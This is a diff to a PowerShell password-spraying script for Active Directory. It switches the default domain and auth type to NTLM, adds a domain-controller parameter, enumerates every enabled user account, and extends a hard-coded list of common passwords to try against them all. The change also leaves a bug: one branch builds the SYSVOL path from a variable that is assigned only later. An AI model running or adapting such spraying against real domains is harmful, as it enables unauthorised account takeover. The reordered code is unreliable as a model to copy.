@@ -1,20 +1,30 @@
 ﻿Param
  (
-    $Domain = 'ant.trd.com',
-    $AuthType = 'Kerberos',
+    $Domain = 'trd.net',
+    $AuthType = 'NTLM',
     [switch]$OnlyShowAuccess = $True,
     [switch]$EnableJitter,
     [switch]$AutoTune,
+    [string]$DomainController,
     $PasswordFile,
     $PassowrdSprayResultsFile
  )
 
-$DomainDCInfo = Get-ADDomainController -Discover -DomainName $Domain
-$DomainDC = $DomainDCInfo.Name
-$DomainDCIP = $DomainDCInfo.IPv4Address
-[array]$DomainInfo = Get-ADDomain -Server $DomainDC
-$DomainInfoDNS = $DomainInfo.DNSRoot
-$RemotePath = "\\$DomainInfoDNS\SYSVOL"
+IF ($DomainController)
+ { 
+    $DomainDC = $DomainController
+    $RemotePath = "\\$DomainController\SYSVOL"
+ }
+ELSE
+ {
+    $DomainDCInfo = Get-ADDomainController -Discover -DomainName $Domain
+    $DomainDC = $DomainDCInfo.Name
+    $DomainDCIP = $DomainDCInfo.IPv4Address
+    $RemotePath = "\\$DomainInfoDNS\SYSVOL"
+ }
+
+ [array]$DomainInfo = Get-ADDomain -Server $DomainDC
+ $DomainInfoDNS = $DomainInfo.DNSRoot
 
 IF ($AutoTune -eq $True)
  { 
@@ -30,15 +40,15 @@ IF ($AutoTune -eq $True)
  }
 
 
-IF (!$PasswordFile)                                                                                
- { [array]$PasswordArray = @('Password99!','Password1234','P@ssw0rd1','1234Password','Password123!','Qwerty!','Zxcvbnm!','Qwertyuiop!','1234asdf!','qwer1234!') }
+IF (!$PasswordFile)                                                                                     
+ { [array]$PasswordArray = @('Password99!','Password1234','P@ssw0rd1','1234Password','Password123!','Qwerty!','Zxcvbnm!','Qwertyuiop!','1234asdf!','qwer1234!','ThisIsASecurePassword!','WilECoyote!','WrongPassword!' ) }
 IF ($PasswordFile)
  { [array]$PasswordArray = Import-CSV $PasswordFile }
 
 [array]$UserAccountArray = Get-ADUser -Filter * -Server $DomainDC | Where { $_.Enabled -eq $True} 
 $UserAccountArray = $UserAccountArray | Sort-Object SamAccountName
 
-Write-Host "Password Spraying using $AuthType against $($UserAccountArray.count) users using $($PasswordArray.Count) passwords..."
+Write-Host "Password Spraying the domain $Domain using $AuthType against $($UserAccountArray.count) users using $($PasswordArray.Count) passwords..."
 ForEach ($PasswordArrayItem in $PasswordArray)
  {
     # Write-host "Password spraying $($UserAccountArray.count) users with the password $PasswordArrayItem"
